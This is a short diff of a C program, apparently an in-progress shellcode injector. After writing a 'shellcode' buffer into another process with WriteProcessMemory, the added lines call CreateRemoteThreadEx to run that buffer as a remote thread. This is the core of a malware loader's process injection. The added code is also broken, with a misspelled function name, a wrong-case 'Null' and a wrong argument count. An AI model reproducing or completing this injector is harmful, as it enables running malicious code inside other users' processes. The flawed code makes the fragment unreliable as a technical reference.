@@ -49,8 +49,24 @@ int main(int argc, char * argv[])
     WriteProcessMemory(hProcess, rBuffer, test, testSize, NULL);
     printf("%s wrote shellcode to the buffer\n", k); //Now I need to have a thread that envokes the information in that buffer
 
+    hThread = CreateRemoteThreadEX(
+        hProcess,
+        Null,
+        0,
+        (LPTHREAD_START_ROUTINE)rBuffer, 
+        NULL,
+        0,
+        0,
+        &dwTID);
     
+    if(hThread == NULL)
+    {
+        printf("Failed to get handle");
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
 
+    
 
     return EXIT_SUCCESS;
 }
